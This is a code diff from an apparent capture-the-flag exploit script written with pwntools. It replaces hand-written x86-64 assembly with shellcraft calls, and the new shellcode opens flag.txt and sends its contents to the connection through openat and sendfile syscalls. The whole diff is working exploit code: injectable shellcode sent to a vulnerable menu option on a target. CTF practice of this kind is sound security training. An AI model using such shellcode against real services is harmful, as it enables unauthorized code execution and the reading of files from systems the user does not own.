@@ -41,33 +41,12 @@ def main():
     # Check https://filippo.io/linux-syscall-table/ about the conventioin for these syscalls.
 
     r.sendlineafter(b'do?', b'9')
-    filename_hex = hex(u64(b'flag.txt'.ljust(8, b'\x00')))
-    info(f'The file name in hex is {filename_hex}')
-    stage_1 = flat(
-            asm(f'''
-                push 0
-                mov rax, {filename_hex}
-                push rax
-                mov rsi, rsp
-                push -100
-                pop rdi
-                push 0
-                pop rdx
-                mov eax, 0x101
-                syscall
-
-                push 0x40
-                pop r10
-                xor dx, dx
-                mov esi, eax
-                push 1
-                pop rdi
-                mov eax, 0x28
-                syscall
-                ''')
+    payload = flat(
+            asm(shellcraft.openat('AT_FDCWD','flag.txt','O_RDONLY')),
+            asm(shellcraft.sendfile(1, 'rax', 0, 0x40)),
             )
-    info(f'stage 1 stage_1 has length {len(stage_1)}')
-    r.sendline(stage_1)
+    info(f'stage 1 stage_1 has length {len(payload)}')
+    r.sendline(payload)
 
     r.interactive()
 
